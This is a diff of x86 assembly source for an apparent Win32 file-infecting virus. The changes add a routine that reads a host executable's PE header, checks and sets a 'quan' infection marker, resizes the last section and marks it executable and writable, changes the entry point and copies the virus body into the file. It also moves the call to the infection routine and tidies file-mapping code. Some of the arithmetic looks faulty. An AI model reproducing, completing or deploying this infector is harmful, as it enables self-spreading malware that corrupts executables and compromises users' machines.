@@ -136,9 +136,9 @@ find_next_file:
 	cmp eax,0
 	je done_find
 	mov dword ptr[ebp+search_handle],eax
-	call infect_file
 	lea eax,[ebp+win32_find_data.FileName]
 	xor eax,eax
+	call infect_file
 	lea eax,[ebp+ offset win32_find_data]
 	push eax
 	push dword ptr[ebp+search_handle]
@@ -164,12 +164,126 @@ infect_file:
 map_into_mem_fail:
     	call unmap_into_mem
 create_file_mapping_fail:
-   	 call uncreate_file_mapping
+   	call uncreate_file_mapping
 open_fail:
-   	 call uncreate_file_handle
-  	 ret
+   	call uncreate_file_handle
+  	ret
 get_host_data:
- 	;;
+	xor eax,eax
+	xor ebx,ebx
+	xor ecx,ecx
+	xor edx,edx
+	
+	mov eax,[ebp+mem_map_handle]
+	add eax,3ch
+	mov ecx,[eax]
+	add ecx,[ebp+mem_map_handle]
+	add eax,ecx    ; point to PE header of host
+	add eax,18h
+	add eax,52	   ; point to reverse bit (infection mark)
+	
+	cmp dword ptr[eax],'quan'
+	je file_not_infect
+	
+	mov eax,ecx
+	add eax,6
+	mov esi,eax
+	mov eax,[eax]
+	mov [ebp+host_no_sect],al   ; number of sections 
+	
+	mov eax,esi
+	add eax,14
+	mov esi,eax
+	mov eax,[eax]
+	mov [ebp+host_opt_size],al	; option header size
+	
+	mov eax,esi
+	add eax,36
+	mov esi,eax
+	mov eax,[eax]
+	mov [ebp+host_sec_alig],eax
+	
+	mov eax,esi
+	add eax,4
+	mov esi,eax
+	mov eax,[eax]
+	mov [ebp+host_sec_alig],eax
+	
+	;mov eax,[ebp+host_sec_alig]
+	mov dl,[ebp+host_no_sect]
+	mul edx
+	
+	push eax
+	mov eax,ecx
+	add eax,18h
+	add eax,10h
+	pop edx
+	mov [eax],edx
+	mov [ebp+host_new_entry],edx
+	
+	mov eax,ecx    ; reloc section table
+	
+	add eax,18h
+	add ax,[ebp+host_opt_size]
+	push eax
+	
+	mov eax,28h
+	mov dx,[ebp+host_no_sect]
+	dec dx
+	mul dx
+	pop edx
+	
+	add edx,eax   ; edx point to reloc section table
+	mov [ebp+host_rel_tab],edx
+	
+	add edx,8				; edx point to virtual size
+	mov dword ptr[edx],virus_size ; set the size of the section
+	mov eax,[edx]
+	
+	push ecx
+	push edx
+	xor ecx,ecx
+	mov ecx,[ebp+host_file_alig]
+	mul ecx
+	pop edx
+	pop ecx
+	mov [edx],eax
+	
+	mov eax,ecx
+	add eax,18h
+	add eax,52
+	
+	mov dword ptr[eax],'quan'
+	mov eax,[ebp+host_rel_tab]
+	add eax,24
+	mov dword ptr[eax],0xF0000060;F0000060h
+	
+	mov eax,ecx
+	add eax,18h
+	add eax,3ch
+	mov eax,[eax]
+	mov [ebp+host_new_entry],eax
+	
+	sub eax,eax
+	mov esi,[ebp+virusCode]
+	mov ax,[ebp+host_no_sect]
+	push ecx
+	sub ecx,ecx
+	mov cx,[ebp+host_file_alig]
+	mul cx
+	pop ecx
+	push eax
+	mov eax,[ebp+mem_map_handle]
+	add eax,[ebp+host_new_entry]
+	pop edx
+	add eax,edx
+	mov edi,eax
+	sub ecx,ecx
+	mov cx,[ebp+virus_size]
+	rep movsb
+	ret
+file_not_infect:
+ 	ret
 open_file:
 	xor eax,eax
 	push eax
@@ -184,10 +298,10 @@ open_file:
     	push eax 
     	call [ebp+CreateFileAAddress]        ;Gets the File Handle for use in CreateFileMapping
     	mov dword ptr[ebp+file_handle],eax 
-   	 ret
+   	ret
 create_file_mapping:
     	push ecx
-    	mov ecx,[ebp+virus_size]
+    	lea ecx,[ebp+virus_size]
     	add ecx,[ebp+win32_find_data.FileSizeLow]
     	push 0
     	push ecx
@@ -203,7 +317,7 @@ map_into_mem:
     	push dword ptr[ebp+win32_find_data.FileSizeHigh]
     	push 0
     	push 0
-    	push 02
+    	push 02h
     	push eax
     	call [ebp+MapViewOfFileAAddress]
     	mov dword ptr[ebp+mem_map_handle],eax
@@ -424,6 +538,7 @@ virtual_out    				dd    0h
 search_handle    				dd    0h
 host_rel_tab    				dd    0h
 host_new_entry    			dd    0h    
+
 Win32FindData struct
 	FileAttributes           	dd 0              ;attributes
       CreationTime             	dd 0,0            ;time of creation
@@ -436,7 +551,7 @@ Win32FindData struct
       FileName                 	db 260 dup(?)         ;long filename
       AlternateFileName        	db 13  dup(?)         ;short filename
 Win32FindData ends
-	win32_find_data Win32FindData {}
+win32_find_data Win32FindData {}
 APIName:
 	FindFirstFileAStr    		db    "FindFirstFileA", 0 
 	FindNextFileAStr    		db    "FindNextFileA", 0 
